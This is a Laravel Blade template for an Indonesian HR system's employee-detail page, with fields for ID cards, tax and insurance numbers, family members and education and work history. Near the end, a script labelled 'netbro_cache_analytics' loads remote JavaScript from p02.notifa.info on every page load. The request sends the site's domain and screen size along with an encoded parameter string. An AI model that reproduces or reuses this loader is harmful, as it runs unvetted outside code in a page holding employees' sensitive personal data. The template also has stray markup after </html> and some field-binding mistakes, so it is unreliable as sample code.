<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="/image/favicon.png">
    <title>Data Karyawan</title>
    <link rel="stylesheet" type="text/css" href="/assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/lib/datatables/css/dataTables.bootstrap.min.css"/>
    <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="/assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/lib/jqvmap/jqvmap.min.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/css/float_button.css">
    <link rel="stylesheet" type="text/css" href="/css/croppie.css">
  </head>
  <body>
    <div class="be-wrapper">
            <div class="be-wrapper be-fixed-sidebar">

            <!--  Sidebar Brand Logo -->

          <div class="be-left-sidebar">
            <div class="brand-logo">
                <img src="/image/logo.png">
            </div>

                 <!--  Sidebar Brand Logo End -->  

                  <!--  Sidebar Start -->  

            <div class="left-sidebar-wrapper"> <a href="#" class="left-sidebar-toggle">MENU</a>
             <div class="left-sidebar-spacer">
              <div class="left-sidebar-scroll">
                <div class="left-sidebar-content">

                     <!--  Sidebar Poto, Username, Edit Profil -->

                    <div class="profil">
                        <div class="circular--portrait">
                            <img class="img-responsive foto-karyawan" src="/image/FotoProfil/{{Auth::user()->foto_profil}}">
                            <div id="username">
                                <a href="profil.html" class="simple_text">{{ Auth::user()->name }}</a>
                            </div>
                           <button onclick="window.location.href='/profil'" type="button" class="btn">Profil</button>
                           <!-- <button class="btn btn-space btn-default active">Default</button> -->
                        </div>
                    </div>

                             <!--  Sidebar Menu-->

                        <ul class="sidebar-elements">
                            <li class="divider">Menu
                                <hr class="Menu">  
                            </li>

                            <li class="active"><a href="/home">
                                <i class="icon fas fa-home"></i>
                                <span>Beranda</span></a>
                            </li>
                                                                     
                            <li class="active">
                                <a class="" href="/datakaryawan">
                                    <i class="icon far fa-address-book"></i>
                                    <span>Data Karyawan</span>
                                </a>
                            </li>

                            <li class="active">
                                <a class=" " href="/presensi">
                                  <i class="icon fas fa-calendar-alt"></i>
                                  <span>Presensi</span>
                              </a>
                            </li>

                              <li class="active">
                                <a class=" " href="/penggajian">
                                   <i class="icon fas fa-money-check-alt"></i>
                                    <span>Penggajian</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class=" " href="/persetujuan_izin">
                                   <i class="icon far fa-calendar-check"></i>
                                    <span>Persetujuan Izin</span>
                                </a>
                              </li>  

                              <li class="divider">Personal
                                 <hr class="Menu">  
                              </li> 

                              <li class="active">
                                <a class=" " href="/gaji">
                                  <i class="icon far fa-money-bill-alt"></i>
                                  <span>Gaji</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class=" " href="/kontak_karyawan">
                                    <i class="icon far fa-id-card"></i>
                                    <span>Kontak Karyawan</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class=" " href="/form_izin">
                                  <i class="icon fab fa-wpforms"></i>
                                  <span>Form Izin</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class="dropdown-item" href="{{ route('logout') }}"
                                       onclick="event.preventDefault();
                                                     document.getElementById('logout-form').submit();">
                                        <i class="icon fas fa-sign-out-alt"></i>
                                        <span>Logout</span>
                                </a>

                                <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                                        @csrf
                                </form>
                              </li>                              
                            </ul>
                         </div>                         
                    </div>
                 </div>
               </div>
            </div>
         </div>


      <!-- Konten -->
      <div class="be-content">
        <div class="page-head">
          <h2 class="page-head-title">Rincian Data Karyawan</h2>
           <ol class="breadcrumb page-head-nav">
            <li><a href="/datakaryawan">Data Karyawan</a></li>
            <li class="active">Rincian Data Karyawan</li>
          </ol>
        </div>
        <div class="main-content container-fluid">
          <div class="row">
            <div class="col-sm-12">
              <div class="panel panel-default panel-table">
                <div class="panel-body">
                
                 <div class="modal-body">
                        
                              <div class="container">
                                <div class="row">
                                  <div class="col-xs-12">
                                    <label class="cabinet center-block">
                                      <div style="margin-left: 25%" class="form-group">
                                      <tr>
                                      <figure>
                                        <td>
                                          <img src="/image/FotoKaryawan/{{$data_karyawan->foto_karyawan}}" class="gambar img-responsive img-thumbnail" id="item-img-output1" />
                                        </td>
                                      &nbsp;&nbsp;
                                        <td>
                                          <img src="/image/FotoKaryawan/{{$data_karyawan->foto_karyawan}}" class="img-thumbnail" id="item-img-output2" />
                                        </td>
                                      <figcaption><i class="fa fa-camera"></i></figcaption>
                                      </figure>
                                      </tr>
                                      <input type="file" class="item-img file center-block" name="file_photo1"/>
                                      <input type="file" class="item-img file center-block" name="file_photo2"/>
                                    </div>
                                    </label>
                                  </div>
                                </div>
                              </div>                           

                              <div class="modal fade" id="cropImagePop" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                                <div class="modal-dialog">
                                  <div class="modal-content">
                                   <div class="modal-body">
                                      <div id="upload-demo" class="center-block"></div>
                                   </div>
                                   <div class="modal-footer">
                                    <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                                    <button type="button" id="cropImageBtn" class="btn btn-primary">Crop</button>
                                   </div>
                                  </div>
                                </div>
                              </div>

                            <br>
                            <div class="form-group">
                              <label>NIK</label>
                              <input type="number" value="{{$data_karyawan->nik}}" placeholder="1234567098765432" class="form-control" disabled="" >
                            </div>
                            <div class="form-group">
                              <label>Nama</label>
                              <input type="text" value="{{$data_karyawan->nama_karyawan}}" placeholder="Adinda Virguinia Ayu Permata Manihuruk" class="form-control" disabled="">
                            </div>
                              <div class="form-group">
                              <label>Jabatan/Divisi</label>
                              <input type="text" value="{{$data_karyawan->divisi}}" placeholder="Tech Development" class="form-control">
                            </div>
                            <div class="form-group">
                              <label>Email address</label>
                              <input type="email" value="{{$data_karyawan->email}}" class="form-control" disabled="">
                            </div>
                            <div class="form-group">
                              <label>Masa Kerja</label>
                              <input type="text" value="{{$data_karyawan->masa_kerja}}" class="form-control" disabled="">              
                            </div>
                            <div class="form-group">
                              <label>Alamat KTP</label>
                              <input type="text" value="{{$data_karyawan->alamat_ktp}}" class="form-control" >
                            </div>
                            <div class="form-group">
                              <label>Alamat Tinggal</label>
                              <input type="text" value="{{$data_karyawan->alamat_tinggal}}" class="form-control" >
                            </div>
                             <div class="form-group">
                              <label>Tempat Kelahiran</label>
                              <input type="text" value="{{$data_karyawan->tempat_lahir}}" class="form-control" disabled="">
                            </div>
                            <div class="row">
                              <div class="form-group col-md-12">
                                <label>Tanggal Lahir</label>
                              </div>
                            </div>
                            <div class="row no-margin-y">
                              <div class="form-group col-xs-3">
                                <input type="text" value="{{DateTime::createFromFormat('Y-m-d',$data_karyawan->tanggal_lahir)->format('d')}}" class="form-control" disabled="">
                              </div>
                              <div class="form-group col-xs-3">
                                <input type="text" value="{{DateTime::createFromFormat('Y-m-d',$data_karyawan->tanggal_lahir)->format('M')}}" class="form-control" disabled="">
                              </div>
                              <div class="form-group col-xs-3">
                                <input type="text" value="{{DateTime::createFromFormat('Y-m-d',$data_karyawan->tanggal_lahir)->format('Y')}}" class="form-control" disabled="">
                              </div>
                            </div>
                             <div class="form-group">
                              <label>No.Telepon</label>
                              <input type="number" value="{{$data_karyawan->no_telp}}" class="form-control" >
                            </div>
                             <div class="form-group">
                              <label>No.KTP</label>
                              <input type="number" value="{{$data_karyawan->no_ktp}}" class="form-control" >
                             </div>
                             <div align="center" class="form-group">
                             <table>
                              <tr>
                               <td align="center">Foto Kartu Keluarga</td>
                               <td align="center">Foto KTP</td>
                              </tr>
                              <tr>
                              <td>
                              <img data-toggle="modal" data-target="#modal-transparent-kk" src="/image/KKKTP/{{$data_karyawan->foto_kk}}" alt="Placeholder" class="img-data">
                              </td>
                              <td>
                              <img data-toggle="modal" data-target="#modal-transparent-ktp" src="/image/KKKTP/{{$data_karyawan->foto_ktp}}" alt="Placeholder" class="img-data">
                              </td>
                              </tr>
                            </table>
                            </div>
                             <!-- Modal Foto Kartu Keluarga-->
                              <div  class="modal modal-transparent fade" id="modal-transparent-kk" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                                    <div class="modal-header">
                                      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                    </div>
                                    <div class="modal-body">
                                      <center>  
                                        <img src="/image/KKKTP/{{$data_karyawan->foto_kk}}" alt="" class="img-responsive">
                                      </center>
                                    </div>
                                    <div class="modal-footer">
                                      <button type="button" class="btn btn-default" data-dismiss="modal">Close</button> 
                                    </div>
                              </div>
                            
                             <!-- Modal Foto KTP-->
                              <div  class="modal modal-transparent fade" id="modal-transparent-ktp" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                                    <div class="modal-header">
                                      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                    </div>
                                    <div class="modal-body">
                                      <center>  
                                        <img src="/image/KKKTP/{{$data_karyawan->foto_ktp}}" alt="" class="img-responsive">
                                      </center>
                                    </div>
                                    <div class="modal-footer">
                                      <button type="button" class="btn btn-default" data-dismiss="modal">Close</button> 
                                    </div>
                              </div>
                             <div class="form-group">
                              <label>No.BPJS</label>
                              <input type="number" value="{{$data_karyawan->no_ktp}}" class="form-control">
                             </div>
                             <label>Foto BPJS</label>
                             <div align="center" class="form-group">
                              <img data-toggle="modal" data-target="#modal-transparent-bpjs" src="/image/BPJS/{{$data_karyawan->foto_bpjs}}" alt="Placeholder" class="img-data">
                             </div>
                             <!-- Modal Foto BPJS-->
                              <div  class="modal modal-transparent fade" id="modal-transparent-bpjs" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                                    <div class="modal-header">
                                      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                    </div>
                                    <div class="modal-body">
                                      <center>  
                                        <img src="/image/BPJS/{{$data_karyawan->foto_bpjs}}" alt="" class="img-responsive">
                                      </center>
                                    </div>
                                    <div class="modal-footer">
                                      <button type="button" class="btn btn-default" data-dismiss="modal">Close</button> 
                                    </div>
                              </div>
                             <div class="form-group">
                              <label>No.NPWP</label>
                              <input type="number" value="{{$data_karyawan->no_npwp}}" class="form-control">
                            </div>
                            <label>Foto NPWP</label><br>
                            <div align="center" class="form-group">
                             <img data-toggle="modal" data-target="#modal-transparent-npwp" src="/image/NPWP/{{$data_karyawan->foto_npwp}}" alt="Placeholder" class="img-data">
                            </div>
                            <!-- Modal Foto NPWP-->
                              <div  class="modal modal-transparent fade" id="modal-transparent-npwp" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                                    <div class="modal-header">
                                      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                    </div>
                                    <div class="modal-body">
                                      <center>  
                                        <img src="/image/NPWP/{{$data_karyawan->foto_npwp}}" alt="" class="img-responsive">
                                      </center>
                                    </div>
                                    <div class="modal-footer">
                                      <button type="button" class="btn btn-default" data-dismiss="modal">Close</button> 
                                    </div>
                              </div>
                            <div class="form-group">
                              <label>No.Telepon Darurat</label>
                              <input type="number" value="{{$data_karyawan->no_telp_darurat}}" class="form-control">
                            </div>
                            <div class="form-group">
                              <label>Hubungan dengan No.Telepon Darurat</label>
                              <input type="text" value="{{$data_karyawan->hub_no_telp_darurat}}" class="form-control">              
                            </div>
                            @if($data_karyawan->status_hubungan == "single")
                              <!-- Do Nothing -->
                            @else
                                @php
                                  $i = 1;
                                @endphp
                                @foreach($data_familia as $familia)

                                  @if($data_karyawan->nik == $familia['nik'])
                                      @if($familia->jenis_hubungan == 'Istri' )
                                            <div class="form-group">
                                              <label>Nama Istri</label>
                                              <input type="text" value="{{$familia->nama_familia}}" class="form-control">              
                                            </div>
                                            <div class="form-group">
                                              <label>Tempat Lahir</label>
                                              <input type="text" value="{{$familia->tempat_lahir_familia}}" class="form-control">
                                            </div>
                                            <div class="row">
                                              <div class="form-group col-md-12">
                                                <label>Tanggal Lahir</label>
                                              </div>
                                            </div>
                                            <div class="row no-margin-y">
                                              <div class="form-group col-xs-3">
                                                <input type="text" value="{{DateTime::createFromFormat('Y-m-d',$familia->tanggal_lahir_familia)->format('d')}}" class="form-control">
                                                </div>
                                                <div class="form-group col-xs-3">
                                                  <input type="text" value="{{DateTime::createFromFormat('Y-m-d',$familia->tanggal_lahir_familia)->format('M')}}" class="form-control">
                                                </div>
                                                <div class="form-group col-xs-3">
                                                  <input type="text" value="{{DateTime::createFromFormat('Y-m-d',$familia->tanggal_lahir_familia)->format('Y')}}" class="form-control">
                                                </div>
                                            </div>
                                      @elseif($familia->jenis_hubungan == 'Suami')
                                            <div class="form-group">
                                              <label>Nama Suami</label>
                                              <input type="text" value="{{$familia->nama_familia}}" class="form-control">              
                                            </div>
                                            <div class="form-group">
                                              <label>Tempat Lahir</label>
                                              <input type="text" value="{{$familia->tempat_lahir_familia}}" class="form-control">
                                            </div>
                                            <div class="row">
                                              <div class="form-group col-md-12">
                                                <label>Tanggal Lahir</label>
                                              </div>
                                            </div>
                                            <div class="row no-margin-y">
                                              <div class="form-group col-xs-3">
                                                <input type="text" value="{{DateTime::createFromFormat('Y-m-d',$familia->tanggal_lahir_familia)->format('d')}}" class="form-control">
                                                </div>
                                                <div class="form-group col-xs-3">
                                                  <input type="text" value="{{DateTime::createFromFormat('Y-m-d',$familia->tanggal_lahir_familia)->format('M')}}" class="form-control">
                                                </div>
                                                <div class="form-group col-xs-3">
                                                  <input type="text" value="{{DateTime::createFromFormat('Y-m-d',$familia->tanggal_lahir_familia)->format('Y')}}" class="form-control">
                                                </div>
                                            </div>
                                      @elseif($familia->jenis_hubungan == 'Anak')
                                             <div class="form-group">
                                              <label>Nama Anak ke-{{$i}}</label>
                                              <input type="text" value="{{$familia->nama_familia}}" class="form-control">
                                            </div>
                                            <div class="form-group">
                                              <label>Jenis Kelamin Anak ke-{{$i}}</label>
                                              <input type="text" value="{{$familia->jenis_kelamin_familia}}" class="form-control">
                                            </div>
                                            <div class="form-group">
                                              <label>Tempat Lahir ke-{{$i}}</label>
                                              <input type="text" value="{{$familia->tempat_lahir_familia}}" class="form-control">
                                            </div>
                                            <div class="row">
                                              <div class="form-group col-md-12">
                                                <label>Tanggal Lahir ke-{{$i}}</label>
                                              </div>
                                            </div>
                                            <div class="row no-margin-y">
                                              <div class="form-group col-xs-3">
                                                <input type="text" value="{{DateTime::createFromFormat('Y-m-d',$familia->tanggal_lahir_familia)->format('d')}}" class="form-control">
                                                </div>
                                                <div class="form-group col-xs-3">
                                                  <input type="text" value="{{DateTime::createFromFormat('Y-m-d',$familia->tanggal_lahir_familia)->format('M')}}" class="form-control">
                                                </div>
                                                <div class="form-group col-xs-3">
                                                  <input type="text" value="{{DateTime::createFromFormat('Y-m-d',$familia->tanggal_lahir_familia)->format('Y')}}" class="form-control">
                                                </div>
                                            </div>
                                            @php
                                              $i++;
                                            @endphp
                                      @else
                                          <!-- Do Nothing!! -->
                                      @endif
                                  @endif
                                  @endforeach


                            @endif
                             <div class="form-group">
                              <label>Status</label>
                                <select name="status" id="status" class="form-control">
                                    <option value="{{$data_karyawan->status_kerja}}">{{$data_karyawan->status_kerja}}</option>
                                    @if($data_karyawan->status_kerja == "Aktif")
                                    <option value="Resign">Resign</option>
                                    @else
                                    <option value="Aktif">Aktif</option>
                                    <option value="Resign" >Resign</option>
                                    @endif
                                </select> 
                          </div>
          </div>
          <!-- End Modal Body -->

          <!--Responsive table-->
            <div class="col-sm-12">
              <div class="panel panel-default panel-table">
                <div class="panel-heading">Riwayat Pendidikan
                  <div class="tools dropdown"></div>
                </div>
                <div class="panel-body">
                  @php
                    $j=1;
                  @endphp
                  <div class="table-responsive noSwipe">
                      @foreach($riwayat_pendidikan as $riwayat_pendidikan)
                          <h4>Riwayat Pendidikan ke-{{$j}}</h4>
                          <div class="form-group">
                              <label>Jenjang Pendidikan ke-{{$j}}</label>
                              <input type="text" value="{{$riwayat_pendidikan->jenjang_pendidikan}}" class="form-control">
                          </div>
                          <div class="form-group">
                              <label>Nama Institusi ke-{{$j}}</label>
                              <input type="text" value="{{$riwayat_pendidikan->nama_sekolah}}" class="form-control">
                          </div>
                          <div class="form-group">
                              <label>Kota Institusi ke-{{$j}}</label>
                              <input type="text" value="{{$riwayat_pendidikan->kota_sekolah}}" class="form-control">
                          </div>
                          <div class="form-group">
                              <label>Jurusan ke-{{$j}}</label>
                              <input type="text" value="{{$riwayat_pendidikan->jurusan_pendidikan}}" class="form-control">
                          </div>
                          <div class="form-group">
                              <label>Periode ke-{{$j}}</label>
                              <input type="text" value="{{$riwayat_pendidikan->periode_pendidikan}}" class="form-control">
                          </div>
                          <div class="form-group">
                              <label>Ijazah Atau Sertifikat ke-{{$j}}</label><br>
                              <div align="center" class="form-group">
                              <img data-toggle="modal" data-target="#modal-transparent-pendidikan{{$riwayat_pendidikan->id_riwayat_pendidikan}}" src="/image/IjazahSertifikat/{{$riwayat_pendidikan->foto_ijazah_sertifikat}}" alt="Placeholder" class="img-data">
                              </div>
                          </div>

                          <!-- Modal Foto Ijazah dan Sertifikat-->
                          
                          <div  class="modal modal-transparent fade" id="modal-transparent-pendidikan{{$riwayat_pendidikan->id_riwayat_pendidikan}}" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                                <div class="modal-header">
                                  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                </div>
                                <div class="modal-body">
                                  <center>  
                                    <img src="/image/IjazahSertifikat/{{$riwayat_pendidikan->foto_ijazah_sertifikat}}" alt="" class="img-responsive">
                                  </center>
                                </div>
                                <div class="modal-footer">
                                  <button type="button" class="btn btn-default" data-dismiss="modal">Close</button> 
                                </div>
                          </div>

                          @php
                            $j++;
                          @endphp
                      @endforeach
                      <div align="center" class="form-group">
                      <button class="btn pmd-btn-fab pmd-btn-raised pmd-ripple-effect btn-default" type="button"><i class="material-icons pmd-sm"> Tambah Riwayat Pendidikan </i></button>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <!--Responsive table-->
            <div class="col-sm-12">
              <div class="panel panel-default panel-table">
                <div class="panel-heading">Riwayat Pekerjaan
                  <div class="tools dropdown"></div>
                </div>
                <div class="panel-body">
                  @php
                    $k=1;
                  @endphp
                  <div class="table-responsive noSwipe">
                      @foreach($riwayat_pekerjaan as $riwayat_pekerjaan)
                          <h4>Riwayat Pekerjaan ke-{{$k}}</h4>
                          <div class="form-group">
                              <label>Nama Perusahaan ke-{{$k}}</label>
                              <input type="text" value="{{$riwayat_pekerjaan->nama_perusahaan}}" class="form-control">
                          </div>
                          <div class="form-group">
                              <label>Jenis Industri ke-{{$k}}</label>
                              <input type="text" value="{{$riwayat_pekerjaan->jenis_industri}}" class="form-control">
                          </div>
                          <div class="form-group">
                              <label>Jabatan Akhir ke-{{$k}}</label>
                              <input type="text" value="{{$riwayat_pekerjaan->jabatan_akhir}}" class="form-control">
                          </div>
                          <div class="form-group">
                              <label>Periode Berakhir Kerja ke-{{$k}}</label>
                              <input type="text" value="{{$riwayat_pekerjaan->periode_berakhir_kerja}}" class="form-control">
                          </div>
                          <div class="form-group">
                              <label>Gaji Akhir ke-{{$k}}</label>
                              <input type="text" value="{{$riwayat_pekerjaan->gaji_akhir}}" class="form-control">
                          </div>
                          <div class="form-group">
                              <label>Alasan Berhenti ke-{{$k}}</label>
                              <input type="text" value="{{$riwayat_pekerjaan->alasan_berhenti}}" class="form-control">
                          </div>
                          <div class="form-group">
                              <label>Surat Pengalaman Kerja ke-{{$k}}</label><br>
                              <div align="center" class="form-group">
                              <img data-toggle="modal" data-target="#modal-transparent-pekerjaan{{$riwayat_pekerjaan->id_riwayat_pekerjaan}}" src="/image/Verklarin/{{$riwayat_pekerjaan->foto_verklarin}}" alt="Placeholder" class="img-data">
                              </div>
                          </div>

                          <!-- Modal Foto Ijazah dan Sertifikat-->
                          
                          <div  class="modal modal-transparent fade" id="modal-transparent-pekerjaan{{$riwayat_pendidikan->id_riwayat_pekerjaan}}" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                                <div class="modal-header">
                                  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                </div>
                                <div class="modal-body">
                                  <center>  
                                    <img src="/image/Verklarin/{{$riwayat_pekerjaan->foto_verklarin}}" alt="" class="img-responsive">
                                  </center>
                                </div>
                                <div class="modal-footer">
                                  <button type="button" class="btn btn-default" data-dismiss="modal">Close</button> 
                                </div>
                          </div>

                          @php
                            $j++;
                          @endphp
                      @endforeach
                      <div align="center" class="form-group">
                      <button class="btn pmd-btn-fab pmd-btn-raised pmd-ripple-effect btn-default" type="button"><i class="material-icons pmd-sm"> Tambah Riwayat Pendidikan </i></button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
              </div>
              <div class="modal-footer">
                  <a href="/datakaryawan"><button type="button" data-dismiss="modal" class="btn btn-default">Kembali</button></a>
                  <a href="/datakaryawan_edit"><button type="button" data-dismiss="modal" class="btn btn-warning">Edit</button></a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

     <div class="text-center">
      <div class="credits">
        <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
      </div>
      </div>
    

    <!-- JS untuk opsi resign di bagian edit data karyawan -->

    <script src="/assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
    <script src="/assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
    <script src="/assets/js/main.js" type="text/javascript"></script>
    <script src="/assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>
    <script src="/js/croppie.js"></script>



    <script type="text/javascript">
      
                                
                                // Start upload preview image
                                  $(".gambar").attr("src", "/image/FotoKaryawan/{{$data_karyawan->foto_karyawan}}");
                                  var $uploadCrop,
                                  tempFilename,
                                  rawImg,
                                  imageId;
                                  function readFile(input) {
                                    if (input.files && input.files[0]) {
                                            var reader = new FileReader();
                                            reader.onload = function (e) {
                                        $('.upload-demo').addClass('ready');
                                        $('#cropImagePop').modal('show');
                                              rawImg = e.target.result;
                                            }
                                            reader.readAsDataURL(input.files[0]);
                                        }
                                        else {
                                          swal("Sorry - you're browser doesn't support the FileReader API");
                                      }
                                  }

                                  $uploadCrop = $('#upload-demo').croppie({
                                    enableExif: true,
                                    enableOrientation: true, 
                                    viewport: {
                                      width: 200,
                                      height: 200,
                                    },
                                    boundary: {
                                        width: 300,
                                        height: 300
                                    }
                                  });

                                  $('#cropImagePop').on('shown.bs.modal', function(){
                                    // alert('Shown pop');
                                    $uploadCrop.croppie('bind', {
                                          url: rawImg
                                        }).then(function(){
                                          console.log('jQuery bind complete');
                                        });
                                  });

                                  $('.item-img').on('change', function () { imageId = $(this).data('id'); tempFilename = $(this).val();
                                                                           $('#cancelCropBtn').data('id', imageId); readFile(this); });
                                  $('#cropImageBtn').on('click', function (ev) {
                                    $uploadCrop.croppie('result', {
                                      type: 'base64',
                                      format: 'jpeg',
                                      size: {width: 200, height: 200}
                                    }).then(function (resp) {
                                      $('#item-img-output2').attr('src',rawImg);
                                      $('#item-img-output1').attr('src', resp);
                                      $('#cropImagePop').modal('hide');
                                    });
                                  });
                              // End upload preview image

    </script>

    <script type="text/javascript">
      document.getElementById("status").onchange = function () {
      document.getElementById("alasan").setAttribute("disabled", "disabled");
       document.getElementById("tgl_resign").setAttribute("disabled", "disabled");
      if (this.value == 'Resign')
        document.getElementById("alasan").removeAttribute("disabled");
      if (this.value == 'Resign')
      document.getElementById("tgl_resign").removeAttribute("disabled");
      };

      // Fungsi Logout

      $(function(){
          $('a#logout').click(function(){
              if(confirm('Apakah anda yakin ingin keluar ?')) {
                  return true;
              }

              return false;
                });
            });


      // Fungsi Menu dashboard

      $(document).ready(function(){

          App.init();
          App.dashboard();

          });
      </script>

      <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };

      </script>

</body>
</html>






                      <div class="modal-body">
                              <div class="container">
                                <div class="row">
                                  <div class="col-xs-12">
                                    <label class="cabinet center-block">
                                      <figure>
                                      <img src="" class="gambar img-responsive img-thumbnail" id="item-img-output" />
                                      <figcaption><i class="fa fa-camera"></i></figcaption>
                                      </figure>
                                      <input type="file" class="item-img file center-block" name="foto_karyawan"/>
                                    </label>
                                  </div>
                                </div>
                              </div>                           

                              <div class="modal fade" id="cropImagePop" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                                <div class="modal-dialog">
                                  <div class="modal-content">
                                   <div class="modal-body">
                                      <div id="upload-demo" class="center-block"></div>
                                   </div>
                                   <div class="modal-footer">
                                    <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                                    <button type="button" id="cropImageBtn" class="btn btn-primary">Crop</button>
                                   </div>
                                  </div>
                                </div>
                              </div>